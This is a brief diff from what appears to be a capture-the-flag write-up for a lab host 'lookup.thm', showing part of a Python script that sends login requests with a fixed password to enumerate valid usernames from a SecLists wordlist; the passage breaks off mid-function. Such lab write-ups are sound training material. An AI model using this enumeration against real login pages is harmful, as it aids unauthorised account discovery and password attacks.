@@ -12,13 +12,13 @@ Trying fig:admin
 
 We can write a small python script that would help us enumerate valid usernames:
 
-#import requests
-#import multiprocessing
+import requests
+import multiprocessing
 
-#target = 'http://lookup.thm/login.php'
-#username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'
+target = 'http://lookup.thm/login.php'
+username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'
 
-#def user_check(name):
+def user_check(name):
     data = {"username": name, "password": "password"}
     try:
         response = requests.post(target, data=data, timeout=5)
